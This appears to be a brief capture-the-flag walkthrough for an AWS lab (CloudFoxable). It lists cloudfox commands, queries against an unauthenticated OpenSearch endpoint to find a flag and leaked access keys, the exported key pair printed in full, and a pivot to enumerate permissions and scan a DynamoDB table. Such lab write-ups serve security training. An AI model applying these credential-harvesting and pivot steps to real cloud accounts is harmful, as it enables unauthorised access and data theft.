#### Run cloudfox endpoints
❯ cloudfox aws -p cloudfoxable_start endpoints -v2

#### Browse to opensearch endpoint (exposed to only your IP with no authentication)
https://search-example-x7fmapx6yfr23auv6in2h3u7ge.us-west-2.es.amazonaws.com/

#### find flag 
https://search-example-x7fmapx6yfr23auv6in2h3u7ge.us-west-2.es.amazonaws.com/_search?pretty=true&q=flag
or
https://search-example-x7fmapx6yfr23auv6in2h3u7ge.us-west-2.es.amazonaws.com/_search?pretty=true&size=100

#### find key
https://search-example-x7fmapx6yfr23auv6in2h3u7ge.us-west-2.es.amazonaws.com/_search?pretty=true&q=key_id
or
https://search-example-x7fmapx6yfr23auv6in2h3u7ge.us-west-2.es.amazonaws.com/_search?pretty=true&size=100

### set found keys and call get-caller-identity

❯ export AWS_ACCESS_KEY_ID=AKIAQXHJKLZKKBSKZR5T
❯ export AWS_SECRET_ACCESS_KEY=harXmptWK/vdcmroXgDvN++7rCK3HfleU76hGY0o
❯ aws sts get-caller-identity
{
    "UserId": "AIDAQXHJKLZKOOMTQT72R",
    "Account": "049881439828",
    "Arn": "arn:aws:iam::049881439828:user/Xavi"
}

#### Find permisisons for Xavi

❯ cloudfox aws -p cloudfoxable_start permissions -v2 --principal Xavi


### Read the DB you hvae access to

aws --region us-west-2 dynamodb scan --table-name example-table

### Find flag
